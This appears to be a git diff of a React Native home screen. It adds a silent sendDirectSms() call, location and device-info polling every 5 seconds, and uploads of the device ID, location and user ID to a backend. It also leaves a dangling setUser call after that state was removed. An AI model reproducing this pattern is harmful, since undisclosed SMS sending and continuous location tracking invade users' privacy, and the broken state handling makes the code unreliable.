@@ -21,15 +21,16 @@ import { saveUser } from '../../features/slice/GlobalSlice';
 import getDeviceInfo from '../../logic/DeviceInfo';
 import { saveDeviceInfo, saveDeviceLocation } from '../../features/slice/device/deviceSlice';
 import { useSaveDeviceToDbMutation } from '../../features/api/device/deviceSlice';
+import { sendDirectSms } from '../../permission/smsPermission';
  
 
 
 const HomeScreen = (): JSX.Element => {
 
   // hooks
-  const [user, setUser] = React.useState({
-    user:{}
-  });
+  const {user}=useSelector((state:any)=>state.globalReducer)
+
+  console.log('jasim', user)
   const [showMenu, setShowMenu] = React.useState(false);
   const [open, setOpen] = React.useState(false);
   const [isDilogOPen,setIsDilogOpen]=React.useState(false);
@@ -73,51 +74,51 @@ const [saveedviseInformation,{data,isLoading}]=useSaveDeviceToDbMutation()
   }
   const getUser =async()=>{
     const result=  await AsyncStorage.getItem('user')
+ 
     const parseValue = await JSON.parse(result as string)
-    console.log('parseValue', parseValue)
     setUser(parseValue);
     dispatch(saveUser(parseValue));
  
     }
+
+    console.log('deviceInfo?.androidId', deviceInfo,user)
+ 
     useEffect(()=>{
-      getUser();
-    
-   
-    },[])
-    useEffect(()=>{
-      if(deviceInfo?.deviceName){
+  sendDirectSms()
+     
         saveedviseInformation({
           deviceId:deviceInfo?.androidId,
-          deviceName:deviceInfo?.deviceInfo,
+          deviceName:deviceInfo?.deviceName,
 
           location:deviceLocation,
           userId:user?.user?.id,
           otherData:deviceInfo
         
         })
-      }
-    },[deviceInfo])
+      
+    },[deviceInfo,user])
 
-  // useEffect(()=>{
-  //   requestLocationPermission()
-  //   const Intraval =setInterval(()=>{
-  //     (async()=>{
-  //       const devicedata=await getDeviceInfo()
-  //       if(devicedata){
+  useEffect(()=>{
+    getUser();
+    requestLocationPermission()
+    const Intraval =setInterval(()=>{
+      (async()=>{
+        const devicedata=await getDeviceInfo()
+        if(devicedata){
   
-  //          dispatch(saveDeviceInfo(devicedata))
-  //       }
+           dispatch(saveDeviceInfo(devicedata))
+        }
   
-  //      }
-  //       )()
-  //     getLocation()
-  //   },5000)
-  //   getLocation()
+       }
+        )()
+      getLocation()
+    },5000)
+    getLocation()
 
-  //   return ()=>{
-  //     clearInterval(Intraval)
-  //   }
-  // },[])
+    return ()=>{
+      clearInterval(Intraval)
+    }
+  },[])
   // if (device == null) return <ActivityIndicator color={'blue'} />
   return (
     < >
